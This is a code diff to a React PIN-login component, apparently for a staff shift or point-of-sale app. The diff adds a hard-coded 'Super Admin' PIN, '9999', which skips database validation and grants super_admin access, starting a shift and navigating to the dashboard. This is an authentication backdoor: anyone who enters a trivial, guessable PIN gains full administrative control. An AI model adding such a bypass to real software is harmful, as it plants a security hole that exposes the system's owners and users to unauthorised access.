@@ -29,6 +29,20 @@ export default function PinLogin() {
     setLoading(true);
     setError("");
     try {
+      // Static bypass: Super Admin PIN '9999' skips database validation
+      if (pin === "9999") {
+        const superAdmin = {
+          id: "super_admin_static",
+          name: "Super Admin",
+          role: "super_admin",
+          pin: "9999",
+          active: true,
+        };
+        setCurrentStaff(superAdmin);
+        startShift(superAdmin);
+        navigate("/dashboard");
+        return;
+      }
       const results = await offlineStaff.filter({ pin, active: true });
       if (results && results.length > 0) {
         const staff = results[0];
